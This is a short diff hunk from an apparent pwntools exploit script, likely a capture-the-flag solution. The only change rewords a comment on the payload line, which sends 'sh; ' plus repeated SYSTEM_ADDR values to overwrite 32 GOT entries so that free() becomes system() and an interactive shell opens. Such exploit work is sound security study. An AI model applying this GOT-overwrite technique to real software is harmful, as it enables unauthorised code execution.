@@ -164,5 +164,5 @@ if __name__ == "__main__":
     raw_input('[8] go?')
     s('a')
     s('g')
-    s('sh; ' + p32(0) + p32(SYSTEM_ADDR) * 32) # 32 overwrites!!!
+    s('sh; ' + p32(0) + p32(SYSTEM_ADDR) * 32) # 32 GOT entries will be overwritten!!!
     r.interactive() # free("sh; \x00") => system("sh; \x00")
